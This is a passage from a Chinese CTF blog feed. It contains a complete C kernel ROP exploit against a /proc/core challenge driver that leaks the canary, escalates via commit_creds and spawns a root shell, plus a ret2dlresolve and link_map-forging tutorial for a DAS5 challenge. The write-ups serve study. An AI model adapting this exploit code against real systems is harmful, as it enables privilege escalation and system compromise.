class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IRETQ_RET 0xffffffff813eb448</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> *commit_creds = <span class="hljs-literal">NULL</span>, *prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><br>    <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_privilige</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-type">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. &quot;</span><br>         <span class="hljs-string">&quot;Execve root shell now...\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889b</span>, buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_off</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> off)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889c</span>, off);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy_func</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> nbytes)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889a</span>, nbytes);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    save_status();<br><br>    <span class="hljs-type">int</span> fd;<br>    fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the /proc/core !\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <br>    FILE *sym_table_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> addr;<br>    <span class="hljs-type">char</span> type[<span class="hljs-number">0x10</span>], buf[<span class="hljs-number">0x50</span>];<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%lx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds = (<span class="hljs-type">void</span> *)addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of &quot;</span><br>                   <span class="hljs-string">&quot;commit_cred:\033[0m%p\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;            <br>        &#125;<br>        <span class="hljs-keyword">if</span>(!prepare_kernel_cred &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred = (<span class="hljs-type">void</span> *)addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of &quot;</span><br>                   <span class="hljs-string">&quot;prepare_kernel_cred:\033[0m%p\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;           <br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> offset;<br>    offset = (<span class="hljs-type">size_t</span>)commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-type">size_t</span> canary;<br>    set_off(fd, <span class="hljs-number">64</span>);<br>    core_read(fd, buf);<br>    canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-type">size_t</span> rop_chain[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>        rop_chain[i] = canary;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_privilige;<br>    rop_chain[i++] = SWAPGS_POPFQ_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0</span>;<br>    rop_chain[i++] = IRETQ_RET + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    rop_chain[i++] = (user_sp &amp; <span class="hljs-number">0xfffffffffffffff0</span>) + <span class="hljs-number">8</span>;<br>    rop_chain[i++] = user_ss;<br><br>    write(fd, rop_chain, <span class="hljs-number">0x100</span>);<br>    core_copy_func(fd, <span class="hljs-number">0xffffffffffff0000</span> | <span class="hljs-number">0x100</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="跟踪调试"><a href="#跟踪调试" class="headerlink" title="跟踪调试"></a>跟踪调试</h3><p>跟踪一下rop链执行的过程（最好每一步都打一个断点，内核态进入用户态的时候ni会直接继续执行）</p><p><em><strong>start.sh中的kaslr选项改为nokaslr才是关闭地址随机化！！！</strong></em></p><p>调试内核时的.gdbinit：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">source /home/eurus/gef/gef.py<br><br>add-symbol-file /home/eurus/give_to_player/vmlinux<br>set architecture i386:x86-64<br>add-symbol-file /home/eurus/give_to_player/core/core.ko 0xffffffffc0000000 <br>b*0xffffffffc0000131<br></code></pre></td></tr></table></figure><ul><li><p><strong>内核态</strong>：开始执行ROP链</p><img src="/2023/08/03/Kernel-ROP-basic/pc1.png" class title="pc1"><p>栈布局</p><img src="/2023/08/03/Kernel-ROP-basic/stack.png" class title="stack"></li><li><p><strong>内核态执行用户态函数</strong>：进行提权</p><img src="/2023/08/03/Kernel-ROP-basic/pc2.png" class title="pc2"></li><li><p><strong>内核态</strong>：执行swapgs和iretq</p><img src="/2023/08/03/Kernel-ROP-basic/pc3.png" class title="pc3"></li><li><p><strong>用户态</strong>：拿shell</p><img src="/2023/08/03/Kernel-ROP-basic/pc4.png" class title="pc4"></li></ul>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>ROP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>rop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ret2dlresolve</title>
    <link href="/2023/06/27/ret2dlresolve/"/>
    <url>/2023/06/27/ret2dlresolve/</url>
    
    <content type="html"><![CDATA[<p>放假啦*★,°*:.☆(￣▽￣)&#x2F;$:*.°★* 。<br>烤漆+摆烂停更了好久好久好久，欠了好多好多好多债&#x2F;(ㄒoㄒ)&#x2F;~~（一堆复现），开启假期学习生活的第一步从还债开始 </p><img src="/2023/06/27/ret2dlresolve/wjx.png" class title="wjx"><span id="more"></span><h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><p>gdb调试的时候用step命令没有完整的延迟绑定过程，用stepi单步就可以了</p><h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><h3 id="延迟绑定流程"><a href="#延迟绑定流程" class="headerlink" title="延迟绑定流程"></a>延迟绑定流程</h3><img src="/2023/06/27/ret2dlresolve/setvbuf.png" class title="setvbuf"><ul><li><p>主调函数跳入对应.plt，.plt内容如下：</p><img src="/2023/06/27/ret2dlresolve/plt.png" class title="plt"></li><li><p>跳至对应.got.plt中所存地址，.got.plt中所存的初始地址是.plt[1]，所以未绑定时相当于顺序执行.plt，绑定后.got.plt中所存的就是函数的实际地址，这一步之后就直接执行对应函数</p></li><li><p>入栈当前函数对应index</p></li><li><p>跳至plt[0]（plt段开头）</p></li><li><p>入栈linkmap地址（got[1]），执行_dl_runtime_resolve（got[2]），执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">_dl_runtime_resolve(link_map, reloc_arg)<br></code></pre></td></tr></table></figure></li></ul><h3 id="一些重要的段"><a href="#一些重要的段" class="headerlink" title="一些重要的段"></a>一些重要的段</h3><h4 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h4><p>包含了一些关于动态链接的关键信息，重要的是DT_STRTAB, DT_SYMTAB, DT_JMPREL三项，分别包含指向.dynstr, .dynsym, .rel.plt三段的指针</p><img src="/2023/06/27/ret2dlresolve/dynamic.png" class title="dynamic"><p>对应结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf32_Swordd_tag;<span class="hljs-comment">/* Dynamic entry type */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>      Elf32_Word d_val;<span class="hljs-comment">/* Integer value */</span><br>      Elf32_Addr d_ptr;<span class="hljs-comment">/* Address value */</span><br>    &#125; d_un;<br>&#125; Elf32_Dyn;<br></code></pre></td></tr></table></figure><h4 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h4><p>一个字符串表，相关数据结构引用一个字符串时，用的是相对这个section头的偏移</p><img src="/2023/06/27/ret2dlresolve/dynstr.png" class title="dynstr"><h4 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h4><p>一个符号表，每个结构体记录一个符号</p><img src="/2023/06/27/ret2dlresolve/dynsym.png" class title="dynsym"><p>对应结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf32_Wordst_name;<span class="hljs-comment">/* Symbol name (string tbl index) */</span><br>  Elf32_Addrst_value;<span class="hljs-comment">/* Symbol value */</span><br>  Elf32_Wordst_size;<span class="hljs-comment">/* Symbol size */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>st_info;<span class="hljs-comment">/* Symbol type and binding，对于导入函数符号而言是0x12 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>st_other;<span class="hljs-comment">/* Symbol visibility */</span><br>  Elf32_Sectionst_shndx;<span class="hljs-comment">/* Section index */</span><br>&#125; Elf32_Sym;<span class="hljs-comment">//对于导入函数符号而言，其他字段都是0</span><br></code></pre></td></tr></table></figure><h4 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h4><p>重定位表，也是一个结构体数组，每个项对应一个导入函数</p><img src="/2023/06/27/ret2dlresolve/relplt.png" class title="relplt"><p>对应结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf32_Addrr_offset;<span class="hljs-comment">/* 指向got表的指针 */</span><br>  Elf32_Wordr_info; <br> <span class="hljs-comment">//只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略07</span><br> <span class="hljs-comment">//这个导入函数的符号在.dynsym中的下标</span><br>  Elf32_Swordr_addend;<span class="hljs-comment">/* Addend */</span><br>&#125; Elf32_Rela;<br></code></pre></td></tr></table></figure><h3 id="dl-runtime-resolve"><a href="#dl-runtime-resolve" class="headerlink" title="_dl_runtime_resolve"></a>_dl_runtime_resolve</h3><img src="/2023/06/27/ret2dlresolve/dl.png" class title="dl"><p>先看一下link_map的结构，使用的到的只有两个成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span></span><br><span class="hljs-class">  &#123;</span><br>    ElfW(Addr) l_addr;<span class="hljs-comment">/* Difference between the address in the ELF</span><br><span class="hljs-comment">file and the addresses in memory.  */</span><br>    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM<br>      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];<br>    ……<br>  &#125;<br></code></pre></td></tr></table></figure><p>l_info成员指向了之前说到的.dynamic段</p><p>l_addr我的理解是如果开了PIE它的值就是PIE基址</p><p>_dl_runtime_resolve实际调用_fl_fixup函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23</span><br><br>DL_FIXUP_VALUE_TYPE<br>attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE<br>_dl_fixup (<br><span class="hljs-meta"># <span class="hljs-keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br>   ELF_MACHINE_RUNTIME_FIXUP_ARGS,<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br>   <span class="hljs-keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *<span class="hljs-type">const</span> symtab<br>    = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);<br>    <span class="hljs-comment">//取出.dynsym段指针</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *strtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);  <br>    <span class="hljs-comment">//取出.dynstr段指针</span><br><br>  <span class="hljs-type">const</span> PLTREL *<span class="hljs-type">const</span> reloc<br>    = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  <br>    <span class="hljs-comment">//取出.rel.plt段第reloc_arg项的指针</span><br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  <br>    <span class="hljs-comment">//取出.dynsym的第reloc_arg个符号项</span><br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *refsym = sym;<br>  <span class="hljs-type">void</span> *<span class="hljs-type">const</span> rel_addr = (<span class="hljs-type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);  <br>    <span class="hljs-comment">//取出.got.plt表的地址</span><br>  <span class="hljs-type">lookup_t</span> result;<br>  DL_FIXUP_VALUE_TYPE value;<br><br>  <span class="hljs-comment">/* Elf32_Rela的r_info成员开头的07字节检查  */</span><br>  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);<br><br>   <span class="hljs-comment">/* 检查(sym-&gt;st_other)&amp;0x03是否为0 */</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>)<br>    &#123;<br>      ……<br>&#125;<br>    <br>  ……<br><br>   <span class="hljs-comment">/* _dl_lookup_symbol_x函数通过strtab + sym-&gt;st_name（查找函数名）确定函数具体地址 */</span><br>      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,<br>    version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<br><br>     ……<br><br>   <span class="hljs-comment">/* 已知函数地址，进行一些处理（result-&gt;value）  */</span><br>      value = DL_FIXUP_MAKE_VALUE (result,<br>   sym ? (LOOKUP_VALUE_ADDRESS (result)<br>  + sym-&gt;st_value) : <span class="hljs-number">0</span>);<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);<br>      result = l;<br>    &#125;<br><br>  value = elf_machine_plt_value (l, reloc, value);<br><br>  <span class="hljs-keyword">if</span> (sym != <span class="hljs-literal">NULL</span><br>      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="hljs-number">0</span>))<br>    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));<br><br>  <span class="hljs-comment">/* got表写入函数真实地址，或者返回真实地址 */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))<br>    <span class="hljs-keyword">return</span> value;<br><br>  <span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);<br>&#125;<br></code></pre></td></tr></table></figure><p>调用_fl_fixup结束后_dl_runtime_resolve的汇编码如下</p><img src="/2023/06/27/ret2dlresolve/dlend.png" class title="dlend"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mov  dword  ptr [esp],eax<br></code></pre></td></tr></table></figure><p>将返回的函数真实地址放入栈顶， ret 0xc 在将rip跳转至函数真实地址的同时栈帧上调0xc，刚好是函数的参数（32位函数参数放在栈上）</p><img src="/2023/06/27/ret2dlresolve/%E5%8F%82%E6%95%B0.png" class title="参数"><p>（终于结束了我的天呐）</p><h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><h3 id="延迟绑定流程-1"><a href="#延迟绑定流程-1" class="headerlink" title="延迟绑定流程"></a>延迟绑定流程</h3><img src="/2023/06/27/ret2dlresolve/malloc64.png" class title="malloc64"><ul><li><p>主调函数跳入对应.plt.sec，.plt.sec内容如下：</p><img src="/2023/06/27/ret2dlresolve/pltsec64.png" class title="pltsec64"></li><li><p>跳至对应.plt，入栈index，跳转至plt[0]</p><img src="/2023/06/27/ret2dlresolve/plt64.png" class title="plt64"></li><li><p>入栈linkmap地址（got[1]），执行_dl_runtime_resolve_xsavec（got[2]）</p></li></ul><h3 id="dl-runtime-resolve-xsavec"><a href="#dl-runtime-resolve-xsavec" class="headerlink" title="_dl_runtime_resolve_xsavec"></a>_dl_runtime_resolve_xsavec</h3><img src="/2023/06/27/ret2dlresolve/dl64.png" class title="dl64"><p>64位传参从栈变成了寄存器，所以_dl_runtime_resolve_xsavec有些不一样</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="32位-1"><a href="#32位-1" class="headerlink" title="32位"></a>32位</h3><h4 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO RELRO"></a>NO RELRO</h4><p>伪造.dynamic段的字符串表</p><h4 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h4><p>Partial RELRO下.dynamic只读，无法修改，这时候和延迟绑定有关且在可写段的只有link_map，所以可以伪造link_map，见例题</p><h1 id="DAS5-matchmaking-platform"><a href="#DAS5-matchmaking-platform" class="headerlink" title="DAS5 matchmaking platform"></a>DAS5 matchmaking platform</h1><h2 id="漏洞和利用"><a href="#漏洞和利用" class="headerlink" title="漏洞和利用"></a>漏洞和利用</h2><p>input函数存在漏洞</p><img src="/2023/06/27/ret2dlresolve/ida.png" class title="ida"><ul><li><p>首先输入覆盖a1[0]~a1[128（0x80）]</p></li><li><p>v3的类型为char（范围-128~127），本题中加到了128会溢出为-128，所以本题中加减的地址为0x4140（content）和0x40c8（ptr），会溢出为0x40c0（pptr）和0x4048（char类型值和__int64类型值相加char类型值会被符号拓展为8字节，c语言基础忘的一干二净了）</p></li><li><p>程序中几个重要数据关系</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">pptr-&gt;ptr-&gt;堆<br></code></pre></td></tr></table></figure></li><li><p>我们可以通过溢出修改*pptr指向stdout（0x40c8→0x4080）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">pptr-&gt;<span class="hljs-built_in">stdout</span>-&gt;_IO_2_1_stdout_<br></code></pre></td></tr></table></figure></li><li><p>这样当询问”Photo(URL) &gt;&gt; “取*pptr时我们实际上修改的就是_IO_2_1_stdout_，可以泄露pie基址</p></li><li><p>再通过溢出修改*pptr指向link_map（0x4080→0x4008），询问”Hobby &gt;&gt; “就能修改link_map了</p></li></ul><p>ps：我本来想这么麻烦不如直接改puts的got表，但puts的got表地址最低字节是0x20就是空格，会被过滤掉根本发不出去，淦🙂</p><h2 id="link-map的伪造"><a href="#link-map的伪造" class="headerlink" title="link_map的伪造"></a>link_map的伪造</h2><p>_dl_fixup函数中按符号查找的部分如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,<br>    version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p>函数名是由strtab + sym-&gt;st_name得到的</p><ul><li><p>得到strtab的部分代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *strtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);<br><span class="hljs-comment">/* 展开宏定义后如下</span><br><span class="hljs-comment"> * (l)-&gt;l_info[5]-&gt;d_un.d_ptr</span><br><span class="hljs-comment"> * link_map-&gt;l_info[5]+0x8 */</span><br></code></pre></td></tr></table></figure></li><li><p>sym-&gt;st_name是函数名字符串在符号表中的下标，这道题劫持的free函数是0x77</p></li></ul><p>这道题需要在free延迟绑定的时候将puts的got表改成system的地址，所以还需要伪造一下link_map-&gt;l_addr</p><p>将获取的函数真实地址写回got表的步骤如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-type">const</span> rel_addr = (<span class="hljs-type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);<span 